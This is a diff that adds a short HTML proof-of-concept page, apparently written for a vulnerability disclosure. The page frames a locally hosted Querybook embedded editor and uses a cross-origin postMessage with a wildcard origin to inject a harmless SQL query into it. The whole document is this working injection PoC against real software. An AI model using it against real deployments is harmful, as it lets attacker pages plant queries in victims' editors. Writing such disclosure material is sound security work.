@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>postMessage Injection PoC</h1>
+
+  <iframe
+    id="qb"
+    src="http://localhost:10001/demo_environment/_/embedded_editor/"
+    style="width:100%; height:600px; border:1px solid #ccc;">
+  </iframe>
+
+  <button onclick="inject()">Inject Query</button>
+
+  <script>
+    function inject() {
+      const iframe = document.getElementById('qb');
+
+      iframe.contentWindow.postMessage({
+        type: 'SET_QUERY',
+        value: "SELECT 'Injected via postMessage' AS impact;",
+        engine: "sqlite"
+      }, '*');
+    }
+
+    window.addEventListener('message', e => {
+      console.log("Received from Querybook:", e.data);
+    });
+  </script>
+</body>
+</html>
